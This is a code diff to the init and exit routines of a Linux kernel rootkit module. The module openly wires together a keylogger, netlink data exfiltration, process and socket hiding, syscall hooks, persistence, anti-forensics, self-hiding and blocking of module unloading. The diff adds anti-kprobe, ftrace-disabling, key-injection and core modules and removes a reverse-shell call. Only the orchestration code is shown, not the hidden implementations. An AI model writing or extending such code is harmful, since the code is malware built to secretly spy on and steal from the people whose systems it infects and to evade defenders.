@@ -28,27 +28,41 @@
 #include "sysctl_hiding.h"
 #include "breakpoint_detector.h"
 #include "netlink_exfil.h"
+#include "anti_kprobe.h"
+#include "recovery_trigger.h"
+#include "trace_disabler.h"
+#include "heap_encrypt.h"
+#include "key_injector.h"
+#include "rootkit_core.h"
 
 static int __init rootkit_init(void) {
 #ifdef ENABLE_STRING_ENCRYPT
     decrypt_all_strings();
 #endif
+
     anti_debug_and_vm_checks();
+    disable_ftrace_tracing();
+    check_for_breakpoints();
+    check_function_integrity();
+
 #ifdef ENABLE_INLINE_HOOK
     setup_inline_hooks();
 #endif
+
     fh_install_hooks();
+
 #ifdef ENABLE_WATCHDOG
     start_watchdog();
 #endif
+
 #ifdef ENABLE_TRIGGER
     setup_netfilter_trigger();
 #endif
+
     setup_persistence();
     setup_process_hiding();
     setup_socket_hiding();
     setup_syscall_hook();
-    start_reverse_shell();
     start_keylogger();
     setup_anti_forensics();
     setup_packet_filter();
@@ -60,10 +74,11 @@ static int __init rootkit_init(void) {
     start_self_watchdog();
     setup_anti_memdump();
     setup_sysctl_hiding();
-    check_for_breakpoints();
     setup_netlink_exfil();
+    rootkit_core_init();
     hide_module();
     lock_module_unloading();
+
     return 0;
 }
 
@@ -71,16 +86,21 @@ static void __exit rootkit_exit(void) {
 #ifdef ENABLE_TRIGGER
     cleanup_netfilter_trigger();
 #endif
+
 #ifdef ENABLE_WATCHDOG
     stop_watchdog();
 #endif
+
     fh_remove_hooks();
+
 #ifdef ENABLE_INLINE_HOOK
     remove_inline_hooks();
 #endif
+
 #ifdef ENABLE_STRING_ENCRYPT
     encrypt_all_strings();
 #endif
+
     cleanup_persistence();
     remove_process_hiding();
     remove_socket_hiding();
@@ -96,6 +116,7 @@ static void __exit rootkit_exit(void) {
     remove_anti_memdump();
     remove_sysctl_hiding();
     cleanup_netlink_exfil();
+    rootkit_core_exit();
 }
 
 module_init(rootkit_init);
